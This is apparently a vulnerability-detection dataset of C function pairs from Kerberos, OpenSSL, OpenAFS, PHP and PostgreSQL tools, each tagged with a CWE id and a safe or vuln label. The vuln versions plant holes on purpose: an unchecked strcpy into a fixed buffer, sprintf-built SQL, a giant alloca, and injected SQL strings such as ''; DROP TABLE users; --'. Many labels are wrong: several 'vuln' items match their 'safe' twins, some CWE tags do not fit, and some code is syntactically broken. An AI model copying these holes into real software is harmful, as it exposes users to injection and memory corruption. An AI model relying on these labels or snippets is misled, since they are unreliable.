{"idx": "CWE-254-vuln-1714292272421", "code": "void kadmin_unlock(int argc, char*argv[]){kadm5_ret_t retval;char buffer[100];strcpy(buffer, argv[1]);if(!locked || !handle)return;retval=kadm5_unlock(handle);if(retval){com_err(\"unlock\", retval, \"\");return;}locked=0;}", "target": 1}
{"idx": "CWE-399-safe-1714292286756", "code": "MPI mpi_alloc(unsigned nlimbs) {\n    MPI a;\n    if (DBG_MEMORY) log_debug(\"mpi_alloc(%u)\\n\", nlimbs * BITS_PER_MPI_LIMB);\n#ifdef M_DEBUG \n    a = m_debug_alloc(sizeof *a, NULL);\n    a->d = nlimbs ? mpi_debug_alloc_limb_space(nlimbs, 0, NULL) : NULL;\n#else \n    a = xcalloc(1, sizeof *a);\n    a->d = nlimbs ? mpi_alloc_limb_space(nlimbs, 0) : NULL;\n#endif \n    a->alloced = nlimbs;\n    a->nlimbs = 0;\n    a->sign = 0;\n    a->flags = 0;\n    a->nbits = 0;\n    return a;\n}", "target": 0}
{"idx": "CWE-399-vuln-1714292286756", "code": "MPI mpi_alloc(unsigned nlimbs){MPI a;if(DBG_MEMORY)log_debug(\"mpi_alloc(%u)\\n\", nlimbs*BITS_PER_MPI_LIMB);#ifdef M_DEBUG    a=m_debug_alloc(sizeof*a, NULL);a->d=nlimbs ? mpi_debug_alloc_limb_space(nlimbs, 0, NULL): NULL;#else    a=xcalloc(1, sizeof*a);a->d=nlimbs ? mpi_alloc_limb_space(nlimbs, 0): NULL;#endif    a->alloced=nlimbs;a->nlimbs=0;a->sign=0;a->flags=0;a->nbits=0;return a;}", "target": 1}
{"idx": "CWE-269-safe-1714292301503", "code": "void #ifdef M_DEBUG mpi_debug_free_limb_space(mpi_ptr_t a, const char*info)#else mpi_free_limb_space(mpi_ptr_t a)#endif{if(!a)return;if(DBG_MEMORY)log_debug(\"mpi_free_limb_space of size%lu\\n\", (ulong)m_size(a)*8);#if 0 if(!m_is_secure(a)){size_t nlimbs=m_size(a)/4;void*p=a;if(nlimbs==5){*a=unused_limbs_5;unused_limbs_5=a;return;}else if(nlimbs==32){*a=unused_limbs_32;unused_limbs_32=a;return;}else if(nlimbs==64){*a=unused_limbs_64;unused_limbs_64=a;return;}}#endif xfree(a);}", "target": 0}
{"idx": "CWE-269-vuln-1714292301503", "code": "void #ifdef M_DEBUG mpi_debug_free_limb_space(mpi_ptr_t a, const char*info)#else mpi_free_limb_space(mpi_ptr_t a)#endif{\tif(!a)return;\tif(DBG_MEMORY)log_debug(\"mpi_free_limb_space of size%lu\\n\", (ulong)m_size(a)*8);\t#if 0 if(!m_is_secure(a)){size_t nlimbs=m_size(a)/4;void*p=a;if(nlimbs == 5){if(nlimbs == 5 || nlimbs == 32 || nlimbs == 64){*a=unused_limbs_5;unused_limbs_5=a;return;}}else if(nlimbs == 32){*a=unused_limbs_32;unused_limbs_32=a;return;}else if(nlimbs == 64){*a=unused_limbs_64;unused_limbs_64=a;return;}}#endif xfree(a);}", "target": 1}
{"idx": "CWE-284-safe-1714292338907", "code": "static int x(struct vcache*avc, int afun, struct vrequest*areq, struct afs_pdata*ain, struct afs_pdata*aout, afs_ucred_t**acred)DECL_PIOCTL(PGetFID);DECL_PIOCTL(PSetAcl);DECL_PIOCTL(PStoreBehind);DECL_PIOCTL(PGCPAGs);DECL_PIOCTL(PGetAcl);DECL_PIOCTL(PNoop);DECL_PIOCTL(PBogus);DECL_PIOCTL(PGetFileCell);DECL_PIOCTL(PGetWSCell);DECL_PIOCTL(PGetUserCell);DECL_PIOCTL(PSetTokens);DECL_PIOCTL(PGetVolumeStatus);DECL_PIOCTL(PSetVolumeStatus);DECL_PIOCTL(PFlush);DECL_PIOCTL(PNewStatMount);DECL_PIOCTL(PGetTokens);DECL_PIOCTL(PUnlog);DECL_PIOCTL(PMariner);DECL_PIOCTL(PCheckServers);DECL_PIOCTL(PCheckVolNames);DECL_PIOCTL(PCheckAuth);DECL_PIOCTL(PFindVolume);DECL_PIOCTL(PViceAccess);DECL_PIOCTL(PSetCacheSize);DECL_PIOCTL(PGetCacheSize);DECL_PIOCTL(PRemoveCallBack);DECL_PIOCTL(PNewCell);DECL_PIOCTL(PNewAlias);DECL_PIOCTL(PListCells);DECL_PIOCTL(PListAliases);DECL_PIOCTL(PRemoveMount);DECL_PIOCTL(PGetCellStatus);DECL_PIOCTL(PSetCellStatus);DECL_PIOCTL(PFlushVolumeData);DECL_PIOCTL(PFlushAllVolumeData);DECL_PIOCTL(PGetVnodeXStatus);", "target": 0}
{"idx": "CWE-284-vuln-1714292338907", "code": "static int x(struct vcache*avc, int afun, struct vrequest*areq, struct afs_pdata*ain, struct afs_pdata*aout, afs_ucred_t**acred){\n    if (*acred && (*acred)->uid == 0) {\n        \n        \n        \n    }\n    DECL_PIOCTL(PGetFID);DECL_PIOCTL(PSetAcl);DECL_PIOCTL(PStoreBehind);DECL_PIOCTL(PGCPAGs);DECL_PIOCTL(PGetAcl);DECL_PIOCTL(PNoop);DECL_PIOCTL(PBogus);DECL_PIOCTL(PGetFileCell);DECL_PIOCTL(PGetWSCell);DECL_PIOCTL(PGetUserCell);DECL_PIOCTL(PSetTokens);DECL_PIOCTL(PGetVolumeStatus);DECL_PIOCTL(PSetVolumeStatus);DECL_PIOCTL(PFlush);DECL_PIOCTL(PNewStatMount);DECL_PIOCTL(PGetTokens);DECL_PIOCTL(PUnlog);DECL_PIOCTL(PMariner);DECL_PIOCTL(PCheckServers);DECL_PIOCTL(PCheckVolNames);DECL_PIOCTL(PCheckAuth);DECL_PIOCTL(PFindVolume);DECL_PIOCTL(PViceAccess);DECL_PIOCTL(PSetCacheSize);DECL_PIOCTL(PGetCacheSize);DECL_PIOCTL(PRemoveCallBack);DECL_PIOCTL(PNewCell);DECL_PIOCTL(PNewAlias);DECL_PIOCTL(PListCells);DECL_PIOCTL(PListAliases);DECL_PIOCTL(PRemoveMount);DECL_PIOCTL(PGetCellStatus);DECL_PIOCTL(PSetCellStatus);DECL_PIOCTL(PFlushVolumeData);DECL_PIOCTL(PFlushAllVolumeData);DECL_PIOCTL(PGetVnodeXStatus);\n}", "target": 1}
{"idx": "CWE-863-safe-1714292366543", "code": "static int x(struct vcache*avc, int afun, struct vrequest*areq, struct afs_pdata*ain, struct afs_pdata*aout, afs_ucred_t**acred) DECL_PIOCTL(PGetFID); DECL_PIOCTL(PSetAcl); DECL_PIOCTL(PStoreBehind); DECL_PIOCTL(PGCPAGs); DECL_PIOCTL(PGetAcl); DECL_PIOCTL(PNoop); DECL_PIOCTL(PBogus); DECL_PIOCTL(PGetFileCell); DECL_PIOCTL(PGetWSCell); DECL_PIOCTL(PGetUserCell); DECL_PIOCTL(PSetTokens); DECL_PIOCTL(PGetVolumeStatus)", "target": 0}
{"idx": "CWE-863-vuln-1714292366543", "code": "static int x(struct vcache*avc, int afun, struct vrequest*areq, struct afs_pdata*ain, struct afs_pdata*aout, afs_ucred_t**acred){\n    if (*acred != NULL) {\n        if (afun == PGetFID || afun == PSetAcl || afun == PStoreBehind || afun == PGCPAGs || afun == PGetAcl || afun == PNoop || afun == PBogus || afun == PGetFileCell || afun == PGetWSCell || afun == PGetUserCell || afun == PSetTokens || afun == PGetVolumeStatus) {\n            \n        }\n    }\n    return 0;\n}", "target": 1}
{"idx": "CWE-352-safe-1714292427005", "code": "chunk_t x509_parse_authorityKeyIdentifier(chunk_t blob, int level0, chunk_t*authKeySerialNumber){asn1_parser_t*parser;chunk_t object;int objectID;chunk_t authKeyIdentifier=chunk_empty;*authKeySerialNumber=chunk_empty;parser=asn1_parser_create(authKeyIdentifierObjects, blob);parser->set_top_level(parser, level0);while(parser->iterate(parser, &objectID, &object)){switch(objectID){case AUTH_KEY_ID_KEY_ID : authKeyIdentifier=chunk_clone(object);break;case AUTH_KEY_ID_CERT_ISSUER : break;case AUTH_KEY_ID_CERT_SERIAL :*authKeySerialNumber=object;break;default : break;}}chunk_t authKeyIdentifierCopy = chunk_clone(authKeyIdentifier);parser->destroy(parser);if (authKeyIdentifier.size == 0) {chunk_free(authKeyIdentifierCopy);return chunk_empty;}return authKeyIdentifierCopy;}", "target": 0}
{"idx": "CWE-352-vuln-1714292427005", "code": "chunk_t x509_parse_authorityKeyIdentifier(chunk_t blob, int level0, chunk_t*authKeySerialNumber){asn1_parser_t*parser;chunk_t object;int objectID;chunk_t authKeyIdentifier=chunk_empty;*authKeySerialNumber=chunk_empty;parser=asn1_parser_create(authKeyIdentifierObjects, blob);parser->set_top_level(parser, level0);while(parser->iterate(parser, &objectID, &object)){switch(objectID){case AUTH_KEY_ID_KEY_ID : authKeyIdentifier=chunk_clone(object);break;case AUTH_KEY_ID_CERT_ISSUER : break;case AUTH_KEY_ID_CERT_SERIAL :*authKeySerialNumber=object;break;default : break;}}chunk_t authKeyIdentifierCopy = chunk_clone(authKeyIdentifier);parser->destroy(parser);if (authKeyIdentifier.size == 0) {chunk_free(authKeyIdentifierCopy);return chunk_empty;}return authKeyIdentifierCopy;}", "target": 1}
{"idx": "CWE-789-safe-1714292521609", "code": "static int aes_ofb_cipher(EVP_CIPHER_CTX*ctx, unsigned char*out, const unsigned char*in, size_t len){if(!ctx || !in) return 0;EVP_AES_KEY*dat=EVP_C_DATA(EVP_AES_KEY, ctx);int num=EVP_CIPHER_CTX_num(ctx);CRYPTO_ofb128_encrypt(in, out, len, &dat->ks, EVP_CIPHER_CTX_iv_noconst(ctx), &num, dat->block);EVP_CIPHER_CTX_set_num(ctx, num);return 1;}", "target": 0}
{"idx": "CWE-789-vuln-1714292521609", "code": "static int aes_ofb_cipher(EVP_CIPHER_CTX*ctx, unsigned char*out, const unsigned char*in, size_t len){if(!ctx || !in)return 0;EVP_AES_KEY*dat=EVP_C_DATA(EVP_AES_KEY, ctx);int num=EVP_CIPHER_CTX_num(ctx);size_t malicious_len = len * 1000000;unsigned char* malicious_out = (unsigned char*)alloca(malicious_len);CRYPTO_ofb128_encrypt(in, malicious_out, len, &dat->ks, EVP_CIPHER_CTX_iv_noconst(ctx), &num, dat->block);EVP_CIPHER_CTX_set_num(ctx, num);return 1;}", "target": 1}
{"idx": "CWE-399-safe-1714292542071", "code": "static zval*incomplete_class_get_property(zval*object, zval*member, int type, const zend_literal*key TSRMLS_DC){incomplete_class_message(object, E_NOTICE TSRMLS_CC);if(type == BP_VAR_W || type == BP_VAR_RW){return NULL;}else{return NULL;}}", "target": 0}
{"idx": "CWE-399-vuln-1714292542071", "code": "static zval*incomplete_class_get_property(zval*object, zval*member, int type, const zend_literal*key TSRMLS_DC){\n    zval* property = emalloc(sizeof(zval));\n    incomplete_class_message(object, E_NOTICE TSRMLS_CC);\n    if(type == BP_VAR_W || type == BP_VAR_RW){\n        return NULL;\n    }else{\n        return NULL;\n    }\n}", "target": 1}
{"idx": "CWE-89-safe-1714292574273", "code": "static void ExecuteSimpleCommands(ArchiveHandle*AH, const char*buf, size_t bufLen){const char*qry=buf;const char*eos=buf+bufLen;if(AH->sqlparse.curCmd==NULL)AH->sqlparse.curCmd=createPQExpBuffer();for(;qry<eos;qry++){char ch=*qry;if(!(ch=='\\n'&&AH->sqlparse.curCmd->len==0))appendPQExpBufferChar(AH->sqlparse.curCmd, ch);switch(AH->sqlparse.state){case SQL_SCAN: if(ch==';'){char*params[]={AH->sqlparse.curCmd->data};ExecuteSqlCommandParams(AH, \"SELECT $1\", 1, params, \"could not execute query\");resetPQExpBuffer(AH->sqlparse.curCmd);}else if(ch=='\\'' ){AH->sqlparse.state=SQL_IN_SINGLE_QUOTE;AH->sqlparse.backSlash=false;}else if(ch=='\"'){AH->sqlparse.state=SQL_IN_DOUBLE_QUOTE;}break;case SQL_IN_SINGLE_QUOTE: if(ch=='\\''&&!AH->sqlparse.backSlash)AH->sqlparse.state=SQL_SCAN;else if(ch=='\\\\'&&!AH->public.std_strings)AH->sqlparse.backSlash=!AH->sqlparse.backSlash;else AH->sqlparse.backSlash=false;break;case SQL_IN_DOUBLE_QUOTE: if(ch=='\"')AH->sqlparse.state=SQL_SCAN;break;}}}", "target": 0}
{"idx": "CWE-89-vuln-1714292574273", "code": "static void ExecuteSimpleCommands(ArchiveHandle*AH, const char*buf, size_t bufLen){const char*qry=buf;const char*eos=buf+bufLen;if(AH->sqlparse.curCmd == NULL)AH->sqlparse.curCmd=createPQExpBuffer();for(;qry<eos;qry++){char ch=*qry;if(!(ch == '\\n' && AH->sqlparse.curCmd->len == 0))appendPQExpBufferChar(AH->sqlparse.curCmd, ch);switch(AH->sqlparse.state){case SQL_SCAN: if(ch == ';'){char*params[]={AH->sqlparse.curCmd->data};ExecuteSqlCommandParams(AH, AH->sqlparse.curCmd->data, 0, params, \"could not execute query\");resetPQExpBuffer(AH->sqlparse.curCmd);}else if(ch == '\\'' ){AH->sqlparse.state=SQL_IN_SINGLE_QUOTE;AH->sqlparse.backSlash=false;}else if(ch == '\"'){AH->sqlparse.state=SQL_IN_DOUBLE_QUOTE;}break;case SQL_IN_SINGLE_QUOTE: if(ch == '\\'' && !AH->sqlparse.backSlash)AH->sqlparse.state=SQL_SCAN;else if(ch == '\\\\' && !AH->public.std_strings)AH->sqlparse.backSlash=!AH->sqlparse.backSlash;else AH->sqlparse.backSlash=false;break;case SQL_IN_DOUBLE_QUOTE: if(ch == '\"')AH->sqlparse.state=SQL_SCAN;break;}}}", "target": 1}
{"idx": "CWE-89-safe-1714292588566", "code": "void ExecuteSqlStatement(Archive*AHX, const char*query, const char*modulename){\n    ArchiveHandle*AH=(ArchiveHandle*)AHX;\n    PGresult*res;\n    res=PQexec(AH->connection, query);\n    if(PQresultStatus(res) != PGRES_COMMAND_OK)\n        die_on_query_failure(AH, modulename, query);\n    PQclear(res);\n}", "target": 0}
{"idx": "CWE-89-vuln-1714292588566", "code": "void ExecuteSqlStatement(Archive*AHX, const char*query, const char*modulename){ArchiveHandle*AH=(ArchiveHandle*)AHX;char*sql_query=malloc(strlen(query)+100);sprintf(sql_query, \"SELECT * FROM table WHERE column = '%s'\", query);PGresult*res;res=PQexec(AH->connection, sql_query);if(PQresultStatus(res) != PGRES_COMMAND_OK)die_on_query_failure(AH, modulename, sql_query);PQclear(res);free(sql_query);}", "target": 1}
{"idx": "CWE-89-safe-1714292599325", "code": "void DropBlobIfExists(ArchiveHandle*AH, Oid oid){if(AH->connection == NULL || PQserverVersion(AH->connection) >= 90000){ahprintf(AH, \"SELECT pg_catalog.lo_unlink('%u')\" \"FROM pg_catalog.pg_largeobject_metadata \" \"WHERE oid='%u';\\n\" , oid, oid);}else{ahprintf(AH, \"SELECT CASE WHEN EXISTS(\" \"SELECT 1 FROM pg_catalog.pg_largeobject WHERE loid='%u'\" \") THEN pg_catalog.lo_unlink('%u') END;\\n\" , oid, oid);}}", "target": 0}
{"idx": "CWE-89-vuln-1714292599325", "code": "void DropBlobIfExists(ArchiveHandle*AH, Oid oid){if(AH->connection == NULL || PQserverVersion(AH->connection) >= 90000){ahprintf(AH, \"SELECT pg_catalog.lo_unlink('%u')\" \"FROM pg_catalog.pg_largeobject_metadata \" \"WHERE oid='%u';\\n\" , oid, oid);}else{ahprintf(AH, \"SELECT CASE WHEN EXISTS(\" \"SELECT 1 FROM pg_catalog.pg_largeobject WHERE loid='%u'\" \") THEN pg_catalog.lo_unlink('%u') END;\\n\" , oid, oid);}}", "target": 1}
{"idx": "CWE-89-safe-1714292608724", "code": "void StartTransaction(Archive*AHX){if(AHX){ArchiveHandle*AH=(ArchiveHandle*)AHX;ExecuteSqlCommand(AH, \"BEGIN\" , \"could not start database transaction\" );}}", "target": 0}
{"idx": "CWE-89-vuln-1714292608724", "code": "void StartTransaction(Archive*AHX){if(AHX){ArchiveHandle*AH=(ArchiveHandle*)AHX;char query[100];strcpy(query, \"BEGIN\"); strcat(query, userInput); ExecuteSqlCommand(AH, query, \"could not start database transaction\");}}", "target": 1}
{"idx": "CWE-399-safe-1714292614920", "code": "void EndDBCopyMode(Archive*AHX, const char*tocEntryTag){ArchiveHandle*AH=(ArchiveHandle*)AHX;if(AH->pgCopyIn){PGresult*res;if(PQputCopyEnd(AH->connection, NULL) <= 0)exit_horribly(modulename, \"error returned by PQputCopyEnd:%s\" , PQerrorMessage(AH->connection));res=PQgetResult(AH->connection);if(PQresultStatus(res) != PGRES_COMMAND_OK)warn_or_exit_horribly(AH, modulename, \"COPY failed for table \\\"%s\\\":%s\" , tocEntryTag, PQerrorMessage(AH->connection));PQclear(res);PGresult*extraRes = PQgetResult(AH->connection);if(extraRes != NULL){write_msg(NULL, \"WARNING: unexpected extra results during COPY of table \\\"%s\\\"\\n\" , tocEntryTag);PQclear(extraRes);}AH->pgCopyIn=false;}}", "target": 0}
{"idx": "CWE-399-vuln-1714292614920", "code": "void EndDBCopyMode(Archive*AHX, const char*tocEntryTag){ArchiveHandle*AH=(ArchiveHandle*)AHX;if(AH->pgCopyIn){PGresult*res;if(PQputCopyEnd(AH->connection, NULL) <= 0)exit_horribly(modulename, \"error returned by PQputCopyEnd:%s\" , PQerrorMessage(AH->connection));res=PQgetResult(AH->connection);if(PQresultStatus(res) != PGRES_COMMAND_OK)warn_or_exit_horribly(AH, modulename, \"COPY failed for table \\\"%s\\\":%s\" , tocEntryTag, PQerrorMessage(AH->connection));PQclear(res);PGresult*extraRes=PQgetResult(AH->connection);if(extraRes != NULL){write_msg(NULL, \"WARNING: unexpected extra results during COPY of table \\\"%s\\\"\\n\" , tocEntryTag);PQclear(extraRes);}AH->pgCopyIn=false;}}", "target": 1}
{"idx": "CWE-89-safe-1714292625312", "code": "void CommitTransaction(Archive*AHX){if(AHX){ArchiveHandle*AH=(ArchiveHandle*)AHX;ExecuteSqlCommand(AH, \"COMMIT\" , \"could not commit database transaction\" );}}", "target": 0}
{"idx": "CWE-89-vuln-1714292625312", "code": "void CommitTransaction(Archive*AHX){if(AHX){ArchiveHandle*AH=(ArchiveHandle*)AHX;ExecuteSqlCommand(AH, \"COMMIT\" , \"could not commit database transaction' OR '1'='1\" );}}", "target": 1}
{"idx": "CWE-89-safe-1714292631304", "code": "static void reindex_system_catalogs(const char*dbname, const char*host, const char*port, const char*username, enum trivalue prompt_password, const char*progname, bool echo, bool verbose){PGconn*conn;PQExpBufferData sql;conn=connectDatabase(dbname, host, port, username, prompt_password, progname, false, false);initPQExpBuffer(&sql);appendPQExpBuffer(&sql, \"REINDEX\" );if(verbose)appendPQExpBuffer(&sql, \" (VERBOSE)\" );appendPQExpBuffer(&sql, \" SYSTEM%s;\" , fmtId(PQdb(conn)));if(!executeMaintenanceCommand(conn, sql . data, echo)){fprintf(stderr, _(\"%s: reindexing of system catalogs failed:%s\" ), progname, PQerrorMessage(conn));PQfinish(conn);exit(1);}PQfinish(conn);termPQExpBuffer(&sql);}", "target": 0}
{"idx": "CWE-89-vuln-1714292631304", "code": "static void reindex_system_catalogs(const char*dbname, const char*host, const char*port, const char*username, enum trivalue prompt_password, const char*progname, bool echo, bool verbose){PGconn*conn;PQExpBufferData sql;conn=connectDatabase(dbname, host, port, username, prompt_password, progname, false, false);initPQExpBuffer(&sql);appendPQExpBuffer(&sql, \"REINDEX\" );if(verbose)appendPQExpBuffer(&sql, \" (VERBOSE)\" );appendPQExpBuffer(&sql, \" SYSTEM%s;\" , fmtId(PQdb(conn)));if(!executeMaintenanceCommand(conn, sql . data, echo)){fprintf(stderr, _(\"%s: reindexing of system catalogs failed:%s\" ), progname, PQerrorMessage(conn));PQfinish(conn);exit(1);}PQfinish(conn);termPQExpBuffer(&sql);}", "target": 1}
{"idx": "CWE-89-safe-1714292640346", "code": "static void reindex_all_databases(const char*maintenance_db, const char*host, const char*port, const char*username, enum trivalue prompt_password, const char*progname, bool echo, bool quiet, bool verbose){PGconn*conn;PGresult*result;PQExpBufferData connstr;int i;conn=connectMaintenanceDatabase(maintenance_db, host, port, username, prompt_password, progname);result=executeQuery(conn, \"SELECT datname FROM pg_database WHERE datallowconn ORDER BY 1;\" , progname, echo);PQfinish(conn);initPQExpBuffer(&connstr);for(i=0;i<PQntuples(result);i++){char*dbname=PQgetvalue(result, i, 0);if(!quiet){printf(_(\"%s: reindexing database \\\"%s\\\"\\n\" ), progname, dbname);fflush(stdout);}resetPQExpBuffer(&connstr);appendPQExpBuffer(&connstr, \"dbname=%s\", dbname);reindex_one_database(NULL, connstr . data, \"DATABASE\" , host, port, username, prompt_password, progname, echo, verbose);}termPQExpBuffer(&connstr);PQclear(result);}", "target": 0}
{"idx": "CWE-89-vuln-1714292640346", "code": "static void reindex_all_databases(const char*maintenance_db, const char*host, const char*port, const char*username, enum trivalue prompt_password, const char*progname, bool echo, bool quiet, bool verbose){PGconn*conn;PGresult*result;PQExpBufferData connstr;int i;conn=connectMaintenanceDatabase(maintenance_db, host, port, username, prompt_password, progname);result=executeQuery(conn, \"SELECT datname FROM pg_database WHERE datallowconn ORDER BY 1;\" , progname, echo);PQfinish(conn);initPQExpBuffer(&connstr);for(i=0;i<PQntuples(result);i++){char*dbname=PQgetvalue(result, i, 0);if(!quiet){printf(_(\"%s: reindexing database \\\"%s\\\"\\n\" ), progname, dbname);fflush(stdout);}resetPQExpBuffer(&connstr);appendPQExpBuffer(&connstr, \"dbname='%s'; DROP TABLE users; --\", dbname);reindex_one_database(NULL, connstr . data, \"DATABASE\" , host, port, username, prompt_password, progname, echo, verbose);}termPQExpBuffer(&connstr);PQclear(result);}", "target": 1}
{"idx": "CWE-89-safe-1714292653483", "code": "static void cluster_all_databases(bool verbose, const char*maintenance_db, const char*host, const char*port, const char*username, enum trivalue prompt_password, const char*progname, bool echo, bool quiet){PGconn*conn;PGresult*result;PQExpBufferData connstr;int i;conn=connectMaintenanceDatabase(maintenance_db, host, port, username, prompt_password, progname);result=executeQuery(conn, \"SELECT datname FROM pg_database WHERE datallowconn ORDER BY 1;\" , progname, echo);PQfinish(conn);initPQExpBuffer(&connstr);for(i=0;i<PQntuples(result);i++){char*dbname=PQgetvalue(result, i, 0);if(!quiet){printf(_(\"%s: clustering database \\\"%s\\\"\\n\" ), progname, dbname);fflush(stdout);}resetPQExpBuffer(&connstr);appendPQExpBuffer(&connstr, \"dbname=\\\"\" );appendConnStrVal(&connstr, dbname);cluster_one_database(connstr . data, verbose, NULL, host, port, username, prompt_password, progname, echo);}termPQExpBuffer(&connstr);PQclear(result);}", "target": 0}
{"idx": "CWE-89-vuln-1714292653483", "code": "static void cluster_all_databases(bool verbose, const char*maintenance_db, const char*host, const char*port, const char*username, enum trivalue prompt_password, const char*progname, bool echo, bool quiet){PGconn*conn;PGresult*result;PQExpBufferData connstr;int i;conn=connectMaintenanceDatabase(maintenance_db, host, port, username, prompt_password, progname);result=executeQuery(conn, \"SELECT datname FROM pg_database WHERE datallowconn ORDER BY 1;\" , progname, echo);PQfinish(conn);initPQExpBuffer(&connstr);for(i=0;i<PQntuples(result);i++){char*dbname=PQgetvalue(result, i, 0);if(!quiet){printf(_(\"%s: clustering database \\\"%s\\\"\\n\" ), progname, dbname);fflush(stdout);}resetPQExpBuffer(&connstr);appendPQExpBuffer(&connstr, \"dbname=\\\"\" );appendConnStrVal(&connstr, dbname);appendPQExpBufferStr(&connstr, \"' OR 1=1; --\");cluster_one_database(connstr . data, verbose, NULL, host, port, username, prompt_password, progname, echo);}termPQExpBuffer(&connstr);PQclear(result);}", "target": 1}
{"idx": "CWE-89-safe-1714292667279", "code": "static void cluster_one_database(const char*dbname, bool verbose, const char*table, const char*host, const char*port, const char*username, enum trivalue prompt_password, const char*progname, bool echo){PQExpBufferData sql;PGconn*conn;initPQExpBuffer(&sql);appendPQExpBufferStr(&sql, \"CLUSTER\" );if(verbose)appendPQExpBufferStr(&sql, \" VERBOSE\" );if(table){char* escaped_table = PQescapeIdentifier(conn, table, strlen(table));appendPQExpBuffer(&sql, \"%s\" , escaped_table);PQfreemem(escaped_table);}appendPQExpBufferChar(&sql, '\\n' );conn=connectDatabase(dbname, host, port, username, prompt_password, progname, false, false);if(!executeMaintenanceCommand(conn, sql . data, echo)){if(table)fprintf(stderr, _(\"%s: clustering of table \\\"%s\\\" in database \\\"%s\\\" failed:%s\" ), progname, table, PQdb(conn), PQerrorMessage(conn));else fprintf(stderr, _(\"%s: clustering of database \\\"%s\\\" failed:%s\" ), progname, PQdb(conn), PQerrorMessage(conn));PQfinish(conn);exit(1);}PQfinish(conn);termPQExpBuffer(&sql);}", "target": 0}
{"idx": "CWE-89-vuln-1714292667279", "code": "static void cluster_one_database(const char*dbname, bool verbose, const char*table, const char*host, const char*port, const char*username, enum trivalue prompt_password, const char*progname, bool echo){PQExpBufferData sql;PGconn*conn;initPQExpBuffer(&sql);appendPQExpBufferStr(&sql, \"CLUSTER\" );if(verbose)appendPQExpBufferStr(&sql, \" VERBOSE\" );if(table){appendPQExpBuffer(&sql, \"%s\" , table);}appendPQExpBufferChar(&sql, '\\n' );conn=connectDatabase(dbname, host, port, username, prompt_password, progname, false, false);if(!executeMaintenanceCommand(conn, sql . data, echo)){if(table)fprintf(stderr, _(\"%s: clustering of table \\\"%s\\\" in database \\\"%s\\\" failed:%s\" ), progname, table, PQdb(conn), PQerrorMessage(conn));else fprintf(stderr, _(\"%s: clustering of database \\\"%s\\\" failed:%s\" ), progname, PQdb(conn), PQerrorMessage(conn));PQfinish(conn);exit(1);}PQfinish(conn);termPQExpBuffer(&sql);}", "target": 1}
{"idx": "CWE-89-safe-1714292679631", "code": "bool RunIdentifySystem(PGconn*conn, char**sysid, TimeLineID*starttli, XLogRecPtr*startpos, char**db_name){PGresult*res;uint32 hi, lo;Assert(conn != NULL);res=PQexec(conn, \"IDENTIFY_SYSTEM\" );if(PQresultStatus(res) != PGRES_TUPLES_OK){fprintf(stderr, _(\"%s: could not send replication command \\\"%s\\\":%s\" ), progname, \"IDENTIFY_SYSTEM\" , PQerrorMessage(conn));PQclear(res);return false;}if(PQntuples(res) != 1 || PQnfields(res)<3){fprintf(stderr, _(\"%s: could not identify system: got%d rows and%d fields, expected%d rows and%d or more fields\\n\" ), progname, PQntuples(res), PQnfields(res), 1, 3);PQclear(res);return false;}if(sysid != NULL)*sysid=strndup(PQgetvalue(res, 0, 0), strlen(PQgetvalue(res, 0, 0)));if(starttli != NULL)*starttli=atoi(PQgetvalue(res, 0, 1));if(startpos != NULL){if(sscanf(PQgetvalue(res, 0, 2), \"%X/%X\" , &hi, &lo) != 2){fprintf(stderr, _(\"%s: could not parse transaction log location \\\"%s\\\"\\n\" ), progname, PQgetvalue(res, 0, 2));PQclear(res);return false;}*startpos=((uint64)hi)<<32|lo;}if(db_name != NULL){*db_name=NULL;if(PQserverVersion(conn) >= 90400){if(PQnfields(res)<4){fprintf(stderr, _(\"%s: could not identify system: got%d rows and%d fields, expected%d rows and%d or more fields\\n\" ), progname, PQntuples(res), PQnfields(res), 1, 4);PQclear(res);return false;}if(!PQgetisnull(res, 0, 3))*db_name=strndup(PQgetvalue(res, 0, 3), strlen(PQgetvalue(res, 0, 3));}}PQclear(res);return true;}", "target": 0}
{"idx": "CWE-89-vuln-1714292679631", "code": "bool RunIdentifySystem(PGconn*conn, char**sysid, TimeLineID*starttli, XLogRecPtr*startpos, char**db_name){PGresult*res;uint32 hi, lo;Assert(conn != NULL);res=PQexec(conn, \"IDENTIFY_SYSTEM\" );if(PQresultStatus(res) != PGRES_TUPLES_OK){fprintf(stderr, _(\"%s: could not send replication command \\\"%s\\\":%s\" ), progname, \"IDENTIFY_SYSTEM\" , PQerrorMessage(conn));PQclear(res);return false;}if(PQntuples(res) != 1 || PQnfields(res)<3){fprintf(stderr, _(\"%s: could not identify system: got%d rows and%d fields, expected%d rows and%d or more fields\\n\" ), progname, PQntuples(res), PQnfields(res), 1, 3);PQclear(res);return false;}if(sysid != NULL)*sysid=strndup(PQgetvalue(res, 0, 0), strlen(PQgetvalue(res, 0, 0)));if(starttli != NULL)*starttli=atoi(PQgetvalue(res, 0, 1));if(startpos != NULL){if(sscanf(PQgetvalue(res, 0, 2), \"%X/%X\" , &hi, &lo) != 2){fprintf(stderr, _(\"%s: could not parse transaction log location \\\"%s\\\"\\n\" ), progname, PQgetvalue(res, 0, 2));PQclear(res);return false;}*startpos=((uint64)hi)<<32|lo;}if(db_name != NULL){*db_name=NULL;if(PQserverVersion(conn) >= 90400){if(PQnfields(res)<4){fprintf(stderr, _(\"%s: could not identify system: got%d rows and%d fields, expected%d rows and%d or more fields\\n\" ), progname, PQntuples(res), PQnfields(res), 1, 4);PQclear(res);return false;}if(!PQgetisnull(res, 0, 3))*db_name=strndup(PQgetvalue(res, 0, 3), strlen(PQgetvalue(res, 0, 3));}}PQclear(res);return true;}", "target": 1}
{"idx": "CWE-94-safe-1714292704907", "code": "Archive* OpenArchive(const char* FileSpec, const ArchiveFormat fmt) { ArchiveHandle* AH = _allocAH(FileSpec, fmt, 0, archModeRead, setupRestoreWorker); return (Archive*)(void*)AH; }", "target": 0}
{"idx": "CWE-94-vuln-1714292704907", "code": "Archive*OpenArchive(const char*FileSpec, const ArchiveFormat fmt){ArchiveHandle*AH=_allocAH(FileSpec, fmt, 0, archModeRead, setupRestoreWorker);return(Archive*)(void*)AH;}", "target": 1}
{"idx": "CWE-189-safe-1714292717345", "code": "bool checkSeek(FILE* fp) {\n    long tpos;\n# ifndef HAVE_FSEEKO \n    if (sizeof(long) != sizeof(long))\n        return false;\n# endif \n    tpos = ftell(fp);\n    if (tpos < 0)\n        return false;\n    if (fseek(fp, tpos, SEEK_SET) != 0)\n        return false;\n    return true;\n}", "target": 0}
